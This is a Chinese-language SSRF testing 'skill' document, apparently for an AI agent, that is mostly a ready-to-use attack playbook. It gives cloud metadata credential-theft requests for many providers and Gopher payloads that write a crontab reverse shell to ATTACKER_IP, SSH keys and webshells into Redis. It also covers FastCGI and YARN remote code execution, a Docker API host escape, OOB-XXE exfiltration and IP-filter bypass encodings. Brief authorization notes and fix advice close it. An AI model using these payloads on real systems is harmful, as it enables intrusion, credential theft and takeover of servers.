---
name: ssrf-testing
description: SSRF服务器端请求伪造测试
version: 2.0.0
---

# SSRF服务器端请求伪造测试

## 概述

SSRF（Server-Side Request Forgery，服务器端请求伪造）是一种利用服务端发起请求的漏洞，攻击者可以控制服务器向任意目标发出请求，从而访问内网资源、进行端口探测、绕过防火墙或窃取云元数据。本技能涵盖从检测到利用、从基础绕过到高级攻击链的完整方法论。

---

## 1. SSRF检测方法

### 1.1 触发点识别

SSRF漏洞通常出现在以下功能点，需要逐一测试每个输入点：

| 功能点 | 检测示例 |
|--------|----------|
| **URL参数** | `?url=http://...` 、 `?target=...` 、 `?next=...` 、 `?redirect=...` |
| **图片URL处理** | 头像/商品图片远程加载：`<img src="http://xxx" />`、图片裁剪/缩放服务 |
| **文件导入** | 从远程URL导入文档/CSV/XML：`?import=http://...`、Office文档转换服务 |
| **Webhook** | 注册回调地址：`webhook_url=http://...`、通知回调URL |
| **PDF生成** | 传入HTML/URL生成PDF文件（wkhtmltopdf、WeasyPrint等） |
| **代理/转发** | 代理API：`?proxy=http://...`、反向代理转发请求 |
| **回调/通知** | 订单回调、支付通知URL、验证回调 |
| **API聚合** | 后端请求多个第三方API：`?api=http://...&url=...`、SSRF via API gateway |
| **数据库导入** | `LOAD DATA INFILE`、MongoDB `--eval` 远程加载 |

### 1.2 基础检测方法

#### 外部监听检测（首选）

使用公共或自建的监听服务，确认服务器发起了出站请求：

```bash
# 方式一：使用nc监听本地VPS（确认从目标服务器收到连接）
nc -lvnp 4444

# 发送请求触发
http://your-vps-ip:4444/test
http://your-domain.oastify.com/test

# 方式二：使用Burp Collaborator
# 在Burp中生成Collaborator payload → 发送到触发点 → 检查DNS和HTTP交互

# 方式三：使用交互式DNSLog平台
# http://www.dnslog.cn
# http://ceye.io
# https://interactsh.com (ProjectDiscovery)
# 使用平台分配的子域名进行检测，观察DNS查询记录
```

#### 内部回环检测

```bash
# 检测服务器是否返回自身内容
http://127.0.0.1:80
http://localhost:22          # 观察响应时间或端口状态差异
http://0.0.0.0:8080
http://[::1]:80

# 检测内网地址
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
```

#### 协议支持检测

```bash
# 测试不同协议的可用性
file:///etc/passwd                    # 读取本地文件
file:///C:/Windows/win.ini            # Windows系统
dict://127.0.0.1:6379/info            # Dict协议探测Redis
gopher://127.0.0.1:6379/_info         # Gopher协议
ftp://127.0.0.1:21                    # FTP协议
```

---

## 2. 内网端口探测

### 2.1 常见端口探测列表

使用目标服务器作为跳板，向回环地址或内网地址探测开放端口：

```
# 通用服务
22     SSH
80     HTTP
443    HTTPS
8080   HTTP代理/Tomcat
8443   HTTPS备用

# 数据库
3306   MySQL
5432   PostgreSQL
1521   Oracle
1433   MSSQL
27017  MongoDB
6379   Redis
9200   Elasticsearch HTTP
9300   Elasticsearch TCP
11211  Memcached

# 消息队列
5672   RabbitMQ
61616  ActiveMQ
9092   Kafka

# 管理面板
9000   PHP-FPM / FastCGI
10050  Zabbix Agent
10051  Zabbix Server
873    Rsync
1099   RMI / JMX
4444   Metasploit / Reverse
5000   Docker Registry / Flask

# 分布式服务
2181   ZooKeeper
7077   Spark
8088   Hadoop YARN
50070  Hadoop HDFS
```

### 2.2 Burp Intruder批量扫描

```
GET /fetch?url=http://127.0.0.1:§PORT§/ HTTP/1.1
Host: target.com

# Burp Intruder设置
# 1. Payload类型: Numbers (1-65535, step 1)
# 2. Resource pool: 限制并发数避免封IP
# 3. Grep-Match: 设置关键字匹配规则
# 4. 根据响应长度/状态码/时间判断端口状态
```

### 2.3 自动化工具

```bash
# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m portscan --ports "22,80,3306,6379,8080"

# 利用响应时间差进行盲端口扫描
# 开放端口响应快，关闭端口可能立即拒绝连接或超时
```

---

## 3. 云元数据窃取

当目标服务器运行在云环境中，SSRF可被用于访问云服务商元数据服务，获取临时凭证。

### 3.1 AWS

```bash
# IMDSv1 (无需认证)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
curl http://169.254.169.254/latest/meta-data/instance-id
curl http://169.254.169.254/latest/meta-data/public-ipv4
curl http://169.254.169.254/latest/user-data

# IMDSv2 (需先获取token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

# SSRF中的IMDSv2绕过思路
# IMDSv2需要PUT请求获取token，但某些SSRF场景可以构造任意请求方法
```

### 3.2 Google Cloud Platform

```bash
# 元数据服务 (需要Header: Metadata-Flavor: Google)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# 备用端点 (某些SSRF实现不会过滤自定义Header，测试时也需要尝试无Header版本)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### 3.3 Azure

```bash
# Microsoft Azure Instance Metadata Service (IMDS)
# 端点: 169.254.169.254 (与AWS相同)
# 需要Header: Metadata: true

# 基础实例信息
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 获取托管身份访问令牌
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# 其他API版本: 2017-04-02, 2017-08-01, 2017-12-01, 2018-02-01, 2019-06-01, 2019-08-01, 2021-02-01
```

### 3.4 Digital Ocean

```bash
curl http://169.254.169.254/metadata/v1/
curl http://169.254.169.254/metadata/v1/id
curl http://169.254.169.254/metadata/v1/user-data
curl http://169.254.169.254/metadata/v1/region
curl http://169.254.169.254/metadata/v1/private-ipv4
```

### 3.5 阿里云 (Alibaba Cloud / Aliyun)

```bash
# 端点: 100.100.100.200
curl http://100.100.100.200/latest/meta-data/
curl http://100.100.100.200/latest/meta-data/instance-id
curl http://100.100.100.200/latest/meta-data/region-id
curl http://100.100.100.200/latest/meta-data/zone-id
curl http://100.100.100.200/latest/meta-data/private-ipv4
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<role-name>

# 用户自定义数据
curl http://100.100.100.200/latest/user-data
```

### 3.6 腾讯云 (Tencent Cloud)

```bash
# 端点: metadata.tencentyun.com
curl http://metadata.tencentyun.com/latest/meta-data/
curl http://metadata.tencentyun.com/latest/meta-data/instance-name
curl http://metadata.tencentyun.com/latest/meta-data/instance-id
curl http://metadata.tencentyun.com/latest/meta-data/local-ipv4
curl http://metadata.tencentyun.com/latest/meta-data/placement/region
curl http://metadata.tencentyun.com/latest/meta-data/placement/zone
curl http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<role-name>

# 备用端点
http://metadata.tencentyun.internal/
```

### 3.7 其他云服务商

```bash
# IBM Cloud
http://169.254.169.254/latest/meta-data/

# Oracle Cloud
http://169.254.169.254/opc/v1/instance/

# OpenStack
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/user_data

# Vultr
http://169.254.169.254/v1.json

# Linode
http://169.254.169.254/linode/
```

---

## 4. Gopher协议攻击

Gopher协议是SSRF攻击中的核武器，它允许构造任意TCP数据包，从而与内网中的多种服务交互。

### 4.1 Gopher协议基础

```bash
# 格式: gopher://host:port/_<URL-encoded data>
# 下划线_之后的字节流被原样发送到目标端口

# 基本示例: 发送字符串到Redis
gopher://127.0.0.1:6379/_QUIT
```

### 4.2 Redis未授权访问攻击

Redis在未配置认证时，可利用Gopher协议写入多种持久化文件实现远程命令执行。

#### 写Crontab (定时任务反弹shell)

```bash
# Payload构造思路：
# 1. 设置Redis的备份目录为cron目录
# 2. 设置备份文件名
# 3. 写入包含反弹shell命令的cron条目
# 4. 触发SAVE

# 完整Gopher URL (URL编码后的Redis命令)
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$60%0d%0a%0a%0a%0a* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

#### 写入SSH公钥 (无密码登录)

```bash
# 思路：将SSH公钥写入Redis，然后设置备份目录为/root/.ssh/，写为authorized_keys

# 1. 生成密钥对
ssh-keygen -t rsa -C "ssrf@attack" -f /tmp/sshkey
echo -e "\n\n" >> /tmp/sshkey.pub   # 前后加换行防止破坏格式

# 2. Gopher URL (替换公钥内容)
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$...%0d%0a<URL编码的公钥>...%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$14%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a

# 3. SSH登录
ssh -i /tmp/sshkey root@target-ip
```

#### 写WebShell

```bash
# 如果目标运行Web服务，可以将webshell写入web目录
# 设置备份目录到web根目录
gopher://127.0.0.1:6379/_...set dir /var/www/html/...save
```

### 4.3 MySQL攻击

利用Gopher协议向MySQL发送构造的认证请求，读取任意文件或执行查询：

```bash
# 读取文件 (通过LOAD DATA LOCAL INFILE)
# !! 注意：MySQL客户端需要支持LOCAL INFILE，且服务端发起请求

# Gopherus生成MySQL payload
python3 gopherus.py --exploit mysql
```

### 4.4 FastCGI攻击

PHP-FPM监听9000端口时，可构造FastCGI协议数据包实现远程代码执行：

```bash
# FastCGI攻击原理
# 构造FastCGI参数设置PHP环境变量（如PHP_VALUE: auto_prepend_file）
# 使PHP执行任意代码

# Gopher URL构造 (设置PHP_VALUE并指定远程文件包含)
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%00%00%00%00%00%00%0F%01SCRIPT_FILENAME%00%00%00%00...

# 推荐使用Gopherus生成
python3 gopherus.py --exploit fastcgi --command "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"
```

### 4.5 Memcached攻击

```bash
# Memcached默认端口11211，未授权访问可读/写缓存数据
# 构造set/get命令

# 设置缓存键值
gopher://127.0.0.1:11211/_set key 0 0 10
evil_data
STORED
```

### 4.6 Zabbix攻击

```bash
# Zabbix Server默认端口10051
# 构造Zabbix agent协议数据，可用于远程执行命令

gopher://127.0.0.1:10051/_<ZBX_PROTO_DATA>
```

### 4.7 Gopherus工具使用

Gopherus是专门为SSRF Gopher攻击设计的payload生成工具：

```bash
# 安装
git clone https://github.com/tarunkant/Gopherus
cd Gopherus
python3 gopherus.py

# 支持的攻击模块
python3 gopherus.py --exploit redis          # Redis命令执行
python3 gopherus.py --exploit mysql          # MySQL查询
python3 gopherus.py --exploit fastcgi        # FastCGI RCE
python3 gopherus.py --exploit zabbix         # Zabbix RCE
python3 gopherus.py --exploit pgsql          # PostgreSQL
python3 gopherus.py --exploit smtp           # 利用SMTP
python3 gopherus.py --exploit tomcat         # Tomcat认证绕过
python3 gopherus.py --exploit gopher         # 自定义Gopher

# 示例：生成Redis写Crontab payload
python3 gopherus.py --exploit redis
# 输入: ATTACKER_IP, ATTACKER_PORT → 生成Gopher URL
```

---

## 5. 协议绕过技术

### 5.1 IP地址编码绕过

对服务端IP过滤逻辑进行绕过，使用不同编码形式表示同一地址：

```bash
# 十进制
http://2130706433                # 127.0.0.1
http://3232235521                # 192.168.0.1
http::16777216                   # 1.0.0.0

# 十六进制
http://0x7f000001                # 127.0.0.1
http://0x7f.0.0.1               # 每段十六进制
http://0xC0A80001                # 192.168.0.1
http://0xA9FEA9FE                # 169.254.169.254

# 八进制
http://0177.0.0.1                # 127.0.0.1
http://017700000001              # 整段八进制
http://0251.0372.0251.0376       # 169.254.169.254

# 混合进制
http://127.0.0.1                 # 标准
http://127.1                    # 省略后两段
http://0x7f.1                   # 混合
http://2130706433               # 十进制整数

# 特殊IP绕过
http://0                         # 某些系统0=0.0.0.0=localhost
http://0.0.0.0                  # 监听所有接口
http://127.1                    # 127.1 = 127.0.0.1
```

### 5.2 域名解析绕过

```bash
# xip.io / nip.io 类服务 (使用DNS解析任意IP)
http://127.0.0.1.xip.io                # → 127.0.0.1
http://127.0.0.1.nip.io                # → 127.0.0.1
http://169.254.169.254.xip.io          # → 169.254.169.254
http://1.2.3.4.sslip.io                # → 1.2.3.4

# 本地域名
http://localtest.me                    # → 127.0.0.1
http://lvh.me                          # → 127.0.0.1
http://spoofed.burpcollaborator.net

# 自建DNS重绑定 (DNS Rebinding)
# 原理: DNS查询第一次返回合法IP，第二次返回内网IP
# 工具: https://github.com/nccgroup/rebind
#       https://lock.cmpxchg8b.com/rebind.html

# 步骤:
# 1. 注册域名或使用rebind服务
# 2. 设置TTL为0，使DNS解析每次变化
# 3. 第一次解析 → 合法IP (通过白名单)
# 4. 实际请求 → 内网IP (绕过验证)
```

### 5.3 URL解析差异绕过

利用不同URL解析库的行为差异绕过过滤：

```bash
# @符号绕过 (使用@符号分隔认证信息，不同解析库行为不同)
http://evil.com@127.0.0.1               # RFC中@前为认证信息
http://127.0.0.1#@evil.com              # #后为fragment，服务端可能忽略
http://127.0.0.1%00@evil.com            # Null字节截断
http://evil.com:80@127.0.0.1           # 某些解析库取最后一个@

# 反斜线绕过
http://localhost\@evil.com
http://127.0.0.1\@evil.com

# 双斜线绕过
http://127.0.0.1//evil.com
http://evil.com//127.0.0.1

# 绕过协议限制
http://127.0.0.1:80                     # 使用HTTP端口
https://127.0.0.1                       # 使用HTTPS
http://127.0.0.1:443                    # HTTPS端口使用HTTP

# 利用DNS解析与HTTP请求目标不一致
http://evil.com@127.0.0.1:80#@evil.com
```

### 5.4 302重定向绕过

如果SSRF功能跟随302跳转，可构造跳转链绕过IP过滤：

```bash
# 1. 在攻击者服务器上设置302跳转
# 2. SSRF先请求攻击者服务器（通过白名单）
# 3. 302跳转至内网地址

# 服务器端重定向代码 (PHP示例)
<?php
header('Location: http://169.254.169.254/latest/meta-data/');
?>

# Python Flask示例
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/')
def redirect_to_metadata():
    return redirect('http://169.254.169.254/latest/meta-data/')

# 遵守重定向限制的SSRF实现会自动跟随跳转
http://attacker.com/redirect -> http://169.254.169.254/
```

### 5.5 IPv6绕过

```bash
# IPv6回环地址
http://[::1]                           # IPv6 localhost
http://[::]:80                         # IPv6 all interfaces
http://[0:0:0:0:0:ffff:127.0.0.1]     # IPv4映射IPv6
http://[0:0:0:0:0:ffff:169.254.169.254]
http://[::ffff:127.0.0.1]
http://[::ffff:127.0.0.1]:80

# IPv6本地链路地址
http://[fe80::1]                       # 本地链路
http://[fe80::1%25eth0]               # 指定接口 (%需要URL编码)

# 如果服务器支持IPv6，可能绕过仅针对IPv4的IP过滤
```

### 5.6 DNS AAAA记录/IPv6重绑定

```bash
# 如果服务只对IPv4地址做黑/白名单检查
# 可以将域名解析到IPv6地址绕过

# 使用AAAA记录指向127.0.0.1的IPv6映射
# example.com AAAA ::ffff:127.0.0.1
```

### 5.7 URL混淆与编码

```bash
# Unicode绕过
http://①②⑦.⓪.⓪.①          # 全角数字
http://127。0。0。1              # 中文句号

# 双重URL编码
http://127.0.0.1
# 如果服务端做了URL解码后的IP检查，双重编码可能绕过
%2568%2574%2574%2570%253A%252F%252F127.0.0.1

# 大小写绕过
gOpher://127.0.0.1:6379/_info
GOPHER://127.0.0.1:6379/_info
HTTP://127.0.0.1

# URL短链接服务绕过
http://tinyurl.com/xxxxx -> http://127.0.0.1:6379
```

### 5.8 CRLF注入绕过

```bash
# 如果请求构造存在CRLF注入，可改变请求目标或协议
http://127.0.0.1%0d%0aX-Forwarded-For:%20127.0.0.1
http://127.0.0.1%0d%0aHost:%20internal-service
```

---

## 6. SSRF到RCE攻击链

### 6.1 攻击链概述

SSRF本身通常不能直接执行命令，但结合内网服务的漏洞可以形成完整的RCE攻击链：

```
SSRF触发点 → 内网服务探测 → 服务漏洞利用 → RCE
```

### 6.2 典型RCE链

#### 链1: SSRF + Redis (最经典)

```
SSRF (Gopher) → Redis未授权 → 写Crontab/SSH Key/WebShell → RCE
```

#### 链2: SSRF + FastCGI (PHP-FPM)

```
SSRF (Gopher) → FastCGI协议交互 → 设置PHP环境变量(PHP_VALUE)
  → auto_prepend_file = php://input → 执行任意PHP代码 → RCE
```

#### 链3: SSRF + Hadoop YARN

```
SSRF探测8088端口 → YARN ResourceManager REST API未授权
  → 提交Application请求 → 在NodeManager上执行命令 → RCE
```

```bash
# YARN RCE通过SSRF
# 构造恶意Application提交到YARN REST API
POST http://127.0.0.1:8088/ws/v1/cluster/apps
{
  "application-id": "application_1",
  "application-name": "malicious",
  "am-container-spec": {
    "commands": {
      "command": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
    }
  },
  "application-type": "YARN"
}
```

#### 链4: SSRF + Elasticsearch

```
SSRF探测9200端口 → Elasticsearch未授权
  → 创建恶意index包含脚本 → MVEL沙箱绕过 → RCE
```

#### 链5: SSRF + Docker API

```
SSRF探测2375端口 → Docker Remote API未授权
  → 创建恶意容器挂载宿主根目录 → 在容器内执行命令 → 宿主RCE
```

```bash
# 通过SSRF访问Docker API启动容器
# 1. 探测Docker API
GET http://127.0.0.1:2375/version

# 2. 启动挂载根目录的容器
POST http://127.0.0.1:2375/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "chroot /host bash -c 'chmod u+s /bin/bash'"],
  "Binds": ["/:/host:ro"]
}

# 3. 启动容器
POST http://127.0.0.1:2375/containers/<id>/start

# 4. 执行命令
POST http://127.0.0.1:2375/containers/<id>/exec
```

#### 链6: SSRF + Consul / Eureka

```
SSRF → Consul API (8500) → 注册恶意service → KV存储执行脚本 → RCE
```

#### 链7: SSRF + JMX / RMI

```
SSRF → JMX端口 (1099/1617) → MLet反序列化 → JNDI注入 → RCE
```

#### 链8: SSRF + MinIO

```
SSRF → MinIO API (9000) → 配置更改 → Webhook回调 → RCE
```

### 6.3 Spring Cloud Gateway RCE

```bash
# Spring Cloud Gateway 3.1.0之前的版本存在SPEL表达式注入
# SSRF访问内部Gateway的Actuator端点
POST http://127.0.0.1:8080/actuator/gateway/routes/newroute
{
  "predicates": [{"name": "Path", "args": {"pattern": "/rce"}}],
  "filters": [{
    "name": "RewritePath",
    "args": {
      "_genkey_0": "/#{T(java.lang.Runtime).getRuntime().exec('id')}",
      "_genkey_1": "/rce"
    }
  }],
  "uri": "http://internal-service",
  "order": 0
}
```

### 6.4 Confluence / Jira SSRF to RCE

```bash
# Confluence和Jira的SSRF漏洞常配合与内网逆向代理交互
# 或利用_cp/__utm等端点进行内部服务间请求
```

---

## 7. XXE结合内网探测

SSRF和XXE（XML外部实体注入）常结合使用，形成更强大的攻击面。

### 7.1 XXE触发SSRF

当应用解析用户提供的XML且外部实体未禁用时，可通过XXE发起SSRF：

```xml
<!-- 基础XXE → SSRF：探测内网端口 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>
<root>&xxe;</root>
```

### 7.2 XXE盲读内网服务

```xml
<!-- 结合参数实体和外带通道，盲读内网服务返回 -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:3306">
  <!ENTITY % callhome SYSTEM "http://ATTACKER_IP/?data=%xxe;">
  %callhome;
]>
```

### 7.3 XXE带外数据外带 (OOB-XXE)

```xml
<!-- 将内网探测结果通过DNS/HTTP外带 -->
<!-- 1. 攻击者VPS → DTD文件 -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">
  %dtd;
]>

<!-- 2. evil.dtd 内容 -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER_IP/?file=%file;'>">
%all;
%sendoob;

<!-- 3. XXE触发 -->
<root>&send;</root>
```

### 7.4 XXE + SSRF探测云元数据

```xml
<!-- XXE探测AWS元数据 -->
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- XXE探测阿里云元数据 -->
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "http://100.100.100.200/latest/meta-data/">
]>
<root>&xxe;</root>
```

### 7.5 XXE + SMB/FTP外带

```bash
# 利用SMB协议从内网服务读取文件
# 需要运行Responder或smbserver

# 使用Responder捕获Net-NTLM Hash
python3 Responder.py -I eth0 -v

# XXE payload
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://///ATTACKER_IP/share/passwd">
]>
```

### 7.6 XXE + PHP Expect RCE

```bash
# 如果目标使用PHP且安装了expect扩展
# 可以直接通过XXE执行命令

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>

# 或者组合SSRF扫描后利用
# 先通过XXE扫描内网 → 发现Redis → 再通过SSRF(单独参数)攻击Redis
```

### 7.7 SVG文件上传 + XXE + SSRF

```xml
<!-- 如果应用允许上传SVG文件且解析XML，可以通过SVG触发XXE+SSRF -->
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <image href="http://127.0.0.1:8080/admin" />
</svg>

<!-- 带实体引用的SVG -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
]>
<svg width="128px" height="128px"
     xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### 7.8 DOCX/OOXML + XXE + SSRF

```bash
# Office文档的XML文件中包含XXE payload
# 通过文件上传功能触发服务器解析 → SSRF探测内网

# 篡改word/document.xml或word/_rels/...
```

---

## 8. 自动化工具

### 8.1 SSRFmap

```bash
# SSRF自动检测与利用框架
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# 基础使用
python3 ssrfmap.py -r request.txt -p url

# 参数说明
-r request.txt      # Burp请求文件
-p <param>          # 测试参数名
-m <module>         # 使用的模块

# 模块
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m cloud
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m redis
python3 ssrfmap.py -r request.txt -p url -m fastcgi
python3 ssrfmap.py -r request.txt -p url -m memcache

# 自定义端口范围
python3 ssrfmap.py -r request.txt -p url -m portscan --ports "22,80,3306,6379,8080,9200"
```

### 8.2 Gopherus

```bash
# 生成Gopher协议payload
git clone https://github.com/tarunkant/Gopherus
python3 gopherus.py --exploit redis
```

### 8.3 SSRF Shield / 模糊测试工具

```bash
# ffuf用于SSRF参数模糊测试
ffuf -w wordlist.txt -u "https://target.com/fetch?url=http://FUZZ" \
  -fw 123 -t 50

# use-plumber (参数污染检测)
```

### 8.4 Burp Suite插件

```bash
# Collaborator Everywhere - 自动插入Collaborator payload
# SSRF Chain - 辅助SSRF利用链测试
# Turbo Intruder - 高速批量端口探测
```

---

## 9. 验证与报告

### 9.1 验证清单

- [ ] 确认可以控制请求目标（URL/参数内容被服务器请求）
- [ ] 确认出网请求可被外部监听（通过nc/Collaborator/DNSLog）
- [ ] 确认可访问内网/回环地址
- [ ] 确认可使用不同协议（至少file://或gopher://之一）
- [ ] 尝试绕过IP过滤机制
- [ ] 探测内网开放端口
- [ ] 检查云元数据服务可达性
- [ ] 评估SSRF到RCE的攻击路径
- [ ] 记录完整的PoC和复现步骤

### 9.2 报告要点

- 漏洞功能点及具体参数
- 可访问的内网资源列表
- 可利用的协议（gopher/dict/file/...）
- 云元数据可访问性
- 完整的SSRF到RCE攻击链（如适用）
- 绕过技术的有效性
- 修复建议（URL白名单、协议限制、网络隔离等）

### 9.3 注意事项

- 仅在授权测试环境中进行
- 避免对内网系统造成拒绝服务
- 注意请求频率控制，避免触发WAF/IDS
- Gopher payload可能造成持久化修改，测试后需清理
- 云元数据窃取的凭证应即时销毁，不存储
- 记录所有测试请求和时间戳，便于审计

---

## 10. 修复建议

### 10.1 开发侧

```python
# 1. URL白名单 (最推荐)
ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
parsed = urlparse(url)
if parsed.netloc not in ALLOWED_DOMAINS:
    raise ValueError("Domain not allowed")

# 2. IP地址过滤 (次推荐)
import ipaddress
def is_internal_ip(hostname):
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
        return ip.is_private or ip.is_loopback or ip.is_link_local
    except:
        return True  # 解析失败则拒绝

# 3. 禁用危险协议
# 只允许 http:// 和 https://
if parsed.scheme not in ['http', 'https']:
    raise ValueError("Protocol not allowed")

# 4. DNS重绑定防护
# 先解析IP检查白名单，再发起请求时重新解析并比较
initial_ip = socket.gethostbyname(hostname)
# ... 检查initial_ip ...
# 发起请求前再次解析
final_ip = socket.gethostbyname(hostname)
if initial_ip != final_ip:
    raise ValueError("DNS rebinding detected")
```

### 10.2 运维侧

- 限制服务器的出网策略（只允许必要端口和IP）
- 使用代理服务器转发外部请求
- 禁用不必要的协议（`gopher://`, `dict://`, `file://`等）
- IMDSv2启用并设置严格的token有效期
- 网络隔离：将应用服务器与内部服务网络隔离
